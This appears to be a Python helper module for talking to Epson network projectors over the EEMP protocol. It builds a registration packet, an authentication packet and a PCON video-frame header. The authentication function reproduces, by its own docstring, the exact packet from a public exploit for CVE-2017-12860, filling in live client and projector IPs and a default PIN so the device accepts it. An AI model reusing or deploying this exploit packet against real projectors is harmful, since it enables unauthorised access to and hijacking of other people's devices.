import socket
import struct

def get_hex_ip(ip: str) -> str:
    return socket.inet_aton(ip).hex()

def get_hex_ip_reversed(ip: str) -> str:
    return socket.inet_aton(ip)[::-1].hex()

def get_registration_payload(my_ip: str) -> bytes:
    """
    Returns the exact 68-byte first packet sent by the official Epson client
    on the first TCP connection (Port 3620) to register the client IP.
    """
    import binascii
    hex_ip = get_hex_ip(my_ip)
    p = (
        f"45454d5030313030{hex_ip}0200000030000000007f0000b0f8ef5314000000"
        f"0000000000000000000000000000000000000000000000000000000000000000"
    )
    return binascii.unhexlify(p)

def get_auth_payload(my_ip: str, proj_ip: str, pin: str = "2270") -> bytes:
    """
    Constructs the exact EEMP packet used by the Rhino Security Labs CVE-2017-12860 exploit.
    Crucially, it injects the dynamic Client IP and Projector IP, otherwise the projector
    will reject the payload by silently closing the connection.
    """
    import binascii
    hex_ip = get_hex_ip(my_ip)
    hex_proj = get_hex_ip(proj_ip)
    pin_hex = binascii.hexlify(pin.encode('ascii')).decode()
    
    packet_hex = (
        f"45454d5030313030{hex_ip}040000004a00000001000000001c00000000000000"
        f"ffffff00{hex_proj}0201030005200320200001ff00ff00ff00000810000000010c"
        f"00000026ab9ffbdf{pin_hex}000000000000000000000000ac15c508"
    )
    return binascii.unhexlify(packet_hex)

def get_pcon_video_header(x_offset: int, y_offset: int, width: int, height: int, payload_length: int) -> bytes:
    """
    Constructs the PCON Video Header to wrap MJPEG stream payloads.
    Total length: 16 bytes.
    """
    magic = b"PCON"
    # Network byte order (Big-Endian) required for PCON
    return struct.pack('>4sHHHHI', magic, x_offset, y_offset, width, height, payload_length)
